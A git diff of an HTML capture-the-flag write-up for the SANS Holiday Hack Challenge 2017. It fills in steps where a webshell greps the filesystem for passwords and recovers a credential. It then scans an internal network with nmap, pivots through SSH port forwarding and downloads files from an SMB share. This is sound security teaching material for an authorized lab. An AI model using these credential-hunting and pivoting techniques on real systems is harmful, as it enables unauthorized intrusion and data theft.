@@ -3639,28 +3639,73 @@ we can try to use it to execute commands using a browser.
 </div>
 
 <p>
-Now we can access <a href="https://l2s.northpolechristmastown.com/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php">https://l2s.northpolechristmastown.com/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php</a> and look around. If we do an <code>ls</code> in this webshell, it just returns the local directory, <code>/var/www/html</code>. Nothing in here suggests that we have the webroot for the dev server, <a href="https://dev.northpolechristmastown.com">https://dev.northpolechristmastown.com</a>. 
+Now we can access <a href="https://l2s.northpolechristmastown.com/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php">https://l2s.northpolechristmastown.com/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php</a> and look around. If we do an <code>ls</code> in this webshell, it just returns the local directory, <code>/var/www/html</code>. Nothing in here suggests that we have the webroot for the dev server, <a href="https://dev.northpolechristmastown.com">https://dev.northpolechristmastown.com</a>.
+</p>
+
+<p>
+Let's run <code>find</code> to see if we can find the password in our webshell.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">find / -xdev -type f -user alabaster_snowball 2&gt;/dev/null |xargs grep password
+</pre>
+</div>
+
+<p>
+Within the page full of results we see this:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:            final String password = <span style="font-style: italic;">"stream_unhappy_buy_loss"</span>;
+</pre>
+</div>
+
+<p>
+A closer look at <code>OrderMySql.class</code> using <code>cat /opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class</code> we find:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">final String username = <span style="font-style: italic;">"alabaster_snowball"</span>;
+final String password = <span style="font-style: italic;">"stream_unhappy_buy_loss"</span>;
+</pre>
+</div>
+</div>
+</li>
+
+
+<li><a id="solution" name="solution"></a><a id="sec-6-2-1-5" name="sec-6-2-1-5"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
+</div>
+
+<ul class="org-ul"><li><a id="sec-6-2-1-5-1" name="sec-6-2-1-5-1"></a>What is the topic of The Great Book page available in the web root of the server?<br  /><div class="outline-text-6" id="text-6-2-1-5-1">
+<p>
+On the Topic of Flying Animals
 </p>
 </div>
 </li>
 
-<li><a id="solution" name="solution"></a><a id="sec-6-2-1-5" name="sec-6-2-1-5"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
-
+<li><a id="sec-6-2-1-5-2" name="sec-6-2-1-5-2"></a>What is Alabaster Snowball’s password?<br  /><div class="outline-text-6" id="text-6-2-1-5-2">
 <p>
-Summarize the reference solution that we found
+<code>stream_unhappy_buy_loss</code>
 </p>
 </div>
+</li></ul>
 </li>
 
 <li><a id="alternatives" name="alternatives"></a><a id="sec-6-2-1-6" name="sec-6-2-1-6"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
-
-<p>
-Any other, easier solutions?
-</p>
 </div>
-</li>
+</li></ul>
+</div>
 
-<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-6-2-1-7" name="sec-6-2-1-7"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
+<div id="outline-container-sec-6-2-2" class="outline-4">
+<h4 id="sec-6-2-2"><span class="todo TODO">TODO</span> ripgrep</h4>
+</div>
+<div id="outline-container-sec-6-2-3" class="outline-4">
+<h4 id="sec-6-2-3"><span class="todo TODO">TODO</span> SSH key method</h4>
+<div class="outline-text-4" id="text-6-2-3">
+</div><ul class="org-ul"><li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-6-2-3-1" name="sec-6-2-3-1"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
 
 <p>
 Do we know what issue(s) people were running into?
@@ -3668,7 +3713,7 @@ Do we know what issue(s) people were running into?
 </div>
 </li>
 
-<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-6-2-1-8" name="sec-6-2-1-8"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">
+<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-6-2-3-2" name="sec-6-2-3-2"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">
 
 <p>
 How was the challenge setup? Was there a better way to secure this
@@ -3701,15 +3746,40 @@ What is the file server share name?
 <li><a id="background-information" name="background-information"></a><a id="sec-6-3-1-2" name="sec-6-3-1-2"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">
 
 <p>
-Do we know anything about this system already?
+The scope statement calls out systems on 10.142.0.0/24 as being in scope:
+</p>
+
+<blockquote>
+<p>
+SCOPE: For this entire challenge, you are authorized to attack ONLY
+the Letters to Santa system at l2s.northpolechristmastown.com AND
+other systems on the internal 10.142.0.0/24 network that you access
+through the Letters to Santa system.
+</p>
+</blockquote>
+
+<p>
+The question mentions pivoting through the Letters to Santa server (<code>l2s</code>). A commonly used tool for network discovery is <code>nmap</code>, and we can check that it's available on <code>l2s</code>:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">alabaster_snowball@hhc17-apache-struts1:/tmp/asnow.VmaV55tqZi5rteO9fXHB3kjM$ nmap -V
+
+Nmap version 7.40 ( https://nmap.org )
+Platform: x86_64-pc-linux-gnu
+Compiled with: liblua-5.3.3 openssl-1.1.0c libpcre-8.39 libpcap-1.8.1 nmap-libdnet-1.12 ipv6
+Compiled without:
+Available nsock engines: epoll poll select
+</pre>
+</div>
+
+<p>
+There's a great <code>nmap</code> overview available here: <a href="https://nmap.org/book/nmap-overview-and-demos.html">https://nmap.org/book/nmap-overview-and-demos.html</a>
 </p>
 
 <p>
-Hints:
-</p>
-
-<p>
-List any useful hints here.
+We also know that the SMB suite of protocols uses a lot of ports, but 445 is one of the main ones.
 </p>
 
 <p>
@@ -3717,43 +3787,12 @@ Blog Posts:
 </p>
 
 <p>
-Are any of these useful?
+This post on the SANS Pen Testing Blog seems relevant, but masscan isn't installed on <code>l2s</code>:
 </p>
 
 <ul class="org-ul">
-<li>Putting My Zero Cents In: Using the Free Tier on Amazon Web Services
-(EC2)
-<a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
-Spinning up an EC2 instance, but also a lot of emphasis on how to use
-SSH keys.
-</li>
-<li>Your Pokemon Guide for Essential SQL Pen Test Commands
-<a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
-SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)
-</li>
-<li>Exploiting XXE Vulnerabilities in IIS/.NET
-<a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
-Including remote content in XML
-</li>
-<li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
-<a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
-Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
-CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a>
-</li>
-<li>Go To The Head Of The Class: LD\_PRELOAD For The Win
-<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a>
-</li>
-<li>A Spot of Tee
-<a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
-bash shell, and bypassing the I/O restriction with tee
-</li>
-<li>Understanding and Exploiting Web-based LDAP
-<a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
-LDAP syntax, LDAP injection
-</li>
 <li>Massively Scaling your Scanning
 <a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
-masscan
 </li>
 </ul>
 </div>
@@ -3762,50 +3801,295 @@ masscan
 <li><a id="goal" name="goal"></a><a id="sec-6-3-1-3" name="sec-6-3-1-3"></a>Goal<br  /><div class="outline-text-5" id="text-goal">
 
 <p>
-What are we trying to accomplish?
+Three separate things:
 </p>
+
+<ol class="org-ol">
+<li>Identify the SMB server,
+</li>
+<li>Enumerate the shares on it,
+</li>
+<li>Name the file server share.
+</li>
+</ol>
 </div>
 </li>
 
 <li><a id="approach" name="approach"></a><a id="sec-6-3-1-4" name="sec-6-3-1-4"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
 
 <p>
-Describe the thought process that we tried here. How were we able to use
-the hints or the blog posts?
+Let's follow the <code>nmap</code> overview.
 </p>
+
+<blockquote>
+<p>
+Being the careful type, Felix first starts out with what is known as
+an Nmap list scan (-sL option). This feature simply enumerates every
+IP address in the given target netblock(s) and does a reverse-DNS
+lookup (unless -n was specified) on each. One reason to do this first
+is stealth. The names of the hosts can hint at potential
+vulnerabilities and allow for a better understanding of the target
+network, all without raising alarm bells.
+</p>
+</blockquote>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">alabaster_snowball@hhc17-apache-struts1:/tmp/asnow.sjKK74OSjKfIxlr5otQil8yd$ nmap -sL 10.142.0.0/24
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2018-01-08 02:40 UTC
+Nmap scan report for 10.142.0.0
+Nmap scan report for 10.142.0.1
+Nmap scan report for hhc17-l2s-proxy.c.holidayhack2017.internal (10.142.0.2)
+Nmap scan report for hhc17-apache-struts1.c.holidayhack2017.internal (10.142.0.3)
+Nmap scan report for 10.142.0.4
+Nmap scan report for mail.northpolechristmastown.com (10.142.0.5)
+Nmap scan report for edb.northpolechristmastown.com (10.142.0.6)
+Nmap scan report for hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)
+Nmap scan report for hhc17-emi.c.holidayhack2017.internal (10.142.0.8)
+Nmap scan report for 10.142.0.9
+Nmap scan report for 10.142.0.10
+Nmap scan report for hhc17-apache-struts2.c.holidayhack2017.internal (10.142.0.11)
+Nmap scan report for 10.142.0.12
+Nmap scan report for eaas.northpolechristmastown.com (10.142.0.13)
+Nmap scan report for 10.142.0.14
+Nmap scan report for 10.142.0.15
+...
+</pre>
+</div>
+
+<p>
+Parsing the results a bit:
+</p>
+
+<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
+
+
+<colgroup>
+<col  class="left" />
+
+<col  class="right" />
+</colgroup>
+<thead>
+<tr>
+<th scope="col" class="left">Hostname</th>
+<th scope="col" class="right">IP</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td class="left">hhc17-l2s-proxy</td>
+<td class="right">10.142.0.2</td>
+</tr>
+
+<tr>
+<td class="left">hhc17-apache-struts1</td>
+<td class="right">10.142.0.3</td>
+</tr>
+
+<tr>
+<td class="left">mail</td>
+<td class="right">10.142.0.5</td>
+</tr>
+
+<tr>
+<td class="left">edb</td>
+<td class="right">10.142.0.6</td>
+</tr>
+
+<tr>
+<td class="left">hhc17-smb-server</td>
+<td class="right">10.142.0.7</td>
+</tr>
+
+<tr>
+<td class="left">hhc17-emi</td>
+<td class="right">10.142.0.8</td>
+</tr>
+
+<tr>
+<td class="left">hhc17-apache-struts2</td>
+<td class="right">10.142.0.11</td>
+</tr>
+
+<tr>
+<td class="left">eaas</td>
+<td class="right">10.142.0.13</td>
+</tr>
+</tbody>
+</table>
+
+<p>
+One of the systems is named <code>hhc17-smb-server</code>. 
+</p>
+
+<p>
+Continuing with the overview, we can now narrow in on a single IP:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">alabaster_snowball@hhc17-apache-struts1:/tmp/asnow.sjKK74OSjKfIxlr5otQil8yd$ nmap -p- -PS445 -A -T4 -oA avatartcpscan-%D 10.142.0.7
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2018-01-08 02:51 UTC
+Nmap scan report for hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)
+Host is up (0.00040s latency)<span style="font-weight: bold;">.</span>
+Not shown: 65527 filtered ports
+PORT      STATE SERVICE            VERSION
+135/tcp   open  msrpc              Microsoft Windows RPC
+139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+3389/tcp  open  ssl/ms-wbt-server?
+| ssl-cert: Subject: <span style="font-weight: bold; font-style: italic;">commonName</span>=hhc17-emi
+| Not valid before: 2017-11-06T13:51:23
+|_Not valid after:  2018-05-08T13:51:23
+|_ssl-date: 2018-01-08T02:54:30+00:00; 0s from scanner time.
+5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+5986/tcp  open  ssl/http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+| ssl-cert: Subject: <span style="font-weight: bold; font-style: italic;">commonName</span>=hhc17-emi
+| Subject Alternative Name: DNS:hhc17-emi
+| Not valid before: 2017-11-07T13:52:11
+|_Not valid after:  2018-11-07T13:52:11
+|_ssl-date: 2018-01-08T02:54:30+00:00; 0s from scanner time.
+49666/tcp open  msrpc              Microsoft Windows RPC
+49668/tcp open  msrpc              Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_nbstat: NetBIOS name: HHC17-EMI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 42:01:0a:8e:00:07 (unknown)
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smbv2-enabled: Server supports SMBv2 protocol
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned<span style="font-weight: bold;"> in</span> 205.99 seconds
+</pre>
+</div>
+
+<p>
+So it does indeed seem to be an SMB server. A command-line tool to access it is <code>smbclient</code>:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">alabaster_snowball@hhc17-apache-struts1:/tmp/asnow.sjKK74OSjKfIxlr5otQil8yd$ smbclient -L 10.142.0.7 -U alabaster_snowball
+rbash: smbclient: command not found
+</pre>
+</div>
+
+<p>
+It's not available on <code>l2s</code>. Another option is forwarding a port through SSH:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">user@vps $ ssh alabaster_snowball@l2s.northpolechristmastown.com -O forward -L 4445:10.142.0.7:445
+</pre>
+</div>
+
+<p>
+Now we can access port 445 on <code>hhc17-smb-server</code> via port 4445 on <code>localhost</code>:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">user@vps $ smbclient -L localhost -p 4445 -U alabaster_snowball
+WARNING: The <span style="font-style: italic;">"syslog"</span> option is deprecated
+Enter alabaster_snowball<span style="font-style: italic;">'s password:</span>
+<span style="font-style: italic;">Domain=[HHC17-EMI] OS=[Windows Server 2016 Datacenter 14393] Server=[Windows Server 2016 Datacenter 6.3]</span>
+
+<span style="font-style: italic;">        Sharename       Type      Comment</span>
+<span style="font-style: italic;">        ---------       ----      -------</span>
+<span style="font-style: italic;">        ADMIN$          Disk      Remote Admin</span>
+<span style="font-style: italic;">        C$              Disk      Default share</span>
+<span style="font-style: italic;">        FileStor        Disk</span>
+<span style="font-style: italic;">        IPC$            IPC       Remote IPC</span>
+<span style="font-style: italic;">Connection to localhost failed (Error NT_STATUS_CONNECTION_REFUSED)</span>
+<span style="font-style: italic;">NetBIOS over TCP disabled -- no workgroup available</span>
+</pre>
+</div>
+
+<p>
+<code>FileStor</code> looks interesting. Let's see what's on it:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">user@vps $ smbclient //localhost/FileStor -p 4445 -U alabaster_snowball
+WARNING: The <span style="font-style: italic;">"syslog"</span> option is deprecated
+Enter alabaster_snowball<span style="font-style: italic;">'s password:</span>
+<span style="font-style: italic;">Domain=[HHC17-EMI] OS=[Windows Server 2016 Datacenter 14393] Server=[Windows Server 2016 Datacenter 6.3]</span>
+<span style="font-style: italic;">smb: \&gt; ls</span>
+<span style="font-style: italic;">  .                                   D        0  Wed Dec  6 16:51:46 2017</span>
+<span style="font-style: italic;">  ..                                  D        0  Wed Dec  6 16:51:46 2017</span>
+<span style="font-style: italic;">  BOLO - Munchkin Mole Report.docx      A   255520  Wed Dec  6 16:44:17 2017</span>
+<span style="font-style: italic;">  GreatBookPage3.pdf                  A  1275756  Mon Dec  4 14:21:44 2017</span>
+<span style="font-style: italic;">  MEMO - Calculator Access for Wunorse.docx      A   111852  Mon Nov 27 14:01:36 2017</span>
+<span style="font-style: italic;">  MEMO - Password Policy Reminder.docx      A   133295  Wed Dec  6 16:47:28 2017</span>
+<span style="font-style: italic;">  Naughty and Nice List.csv           A    10245  Thu Nov 30 14:42:00 2017</span>
+<span style="font-style: italic;">  Naughty and Nice List.docx          A    60344  Wed Dec  6 16:51:25 2017</span>
+
+<span style="font-style: italic;">                13106687 blocks of size 4096. 9624115 blocks available</span>
+<span style="font-style: italic;">smb: \&gt; mget *</span>
+<span style="font-style: italic;">getting file \BOLO - Munchkin Mole Report.docx of size 255520 as BOLO - Munchkin Mole Report.docx (1094.4 KiloBytes/sec) (average 1094.4 KiloBytes/sec)</span>
+<span style="font-style: italic;">getting file \GreatBookPage3.pdf of size 1275756 as GreatBookPage3.pdf (2818.7 KiloBytes/sec) (average 2231.9 KiloBytes/sec)</span>
+<span style="font-style: italic;">getting file \MEMO - Calculator Access for Wunorse.docx of size 111852 as MEMO - Calculator Access for Wunorse.docx (666.0 KiloBytes/sec) (average 1924.0 KiloBytes/sec)</span>
+<span style="font-style: italic;">getting file \MEMO - Password Policy Reminder.docx of size 133295 as MEMO - Password Policy Reminder.docx (834.4 KiloBytes/sec) (average 1752.3 KiloBytes/sec)</span>
+<span style="font-style: italic;">getting file \Naughty and Nice List.csv of size 10245 as Naughty and Nice List.csv (99.1 KiloBytes/sec) (average 1599.3 KiloBytes/sec)</span>
+<span style="font-style: italic;">getting file \Naughty and Nice List.docx of size 60344 as Naughty and Nice List.docx (390.3 KiloBytes/sec) (average 1452.3 KiloBytes/sec)</span>
+</pre>
+</div>
 </div>
 </li>
 
 <li><a id="solution" name="solution"></a><a id="sec-6-3-1-5" name="sec-6-3-1-5"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
 
 <p>
-Summarize the reference solution that we found
+We used <code>nmap</code> to list our targets, and found <code>hhc17-smb-server</code>. We
+used SSH forwarding to connect to it with <code>smbclient</code>. We used the
+credentials we found for question 2 to connect.
 </p>
 </div>
 </li>
 
-<li><a id="alternatives" name="alternatives"></a><a id="sec-6-3-1-6" name="sec-6-3-1-6"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
+<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-6-3-1-6" name="sec-6-3-1-6"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
 
 <p>
-Any other, easier solutions?
+It looks like <code>hhc17-smb-server</code> blocks pings. By default, <code>nmap</code> uses
+pings to determine which hosts are up, and which it should scan
+further. We used the "list scan," which just did reverse DNS queries,
+and were able to identify the system quickly. If, however, someone
+just tried to run <code>nmap -p 445 10.142.0.0/24</code>, they wouldn't find the system.
 </p>
-</div>
-</li>
-
-<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-6-3-1-7" name="sec-6-3-1-7"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
 
 <p>
-Do we know what issue(s) people were running into?
+It also looked like two systems were mixed up in NetBIOS and RDP SSL cert names:
 </p>
-</div>
-</li>
 
-<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-6-3-1-8" name="sec-6-3-1-8"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">
-
-<p>
-How was the challenge setup? Was there a better way to secure this
-system?
-</p>
+<pre class="example">
+Nmap scan report for hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)
+...
+3389/tcp  open  ssl/ms-wbt-server?
+| ssl-cert: Subject: commonName=hhc17-emi
+...
+Host script results:
+| nbstat: NetBIOS name: HHC17-EMI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 42:01:0a:8e:00:07 (unknown)
+...
+Nmap scan report for hhc17-emi.c.holidayhack2017.internal (10.142.0.8)
+...
+3389/tcp  open  ssl/ms-wbt-server?
+| ssl-cert: Subject: commonName=hhc17-smb-server
+...
+Host script results:
+| nbstat: NetBIOS name: HHC17-SMB-SERVE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 42:01:0a:8e:00:08 (unknown)
+</pre>
 </div>
 </li></ul>
 </div>
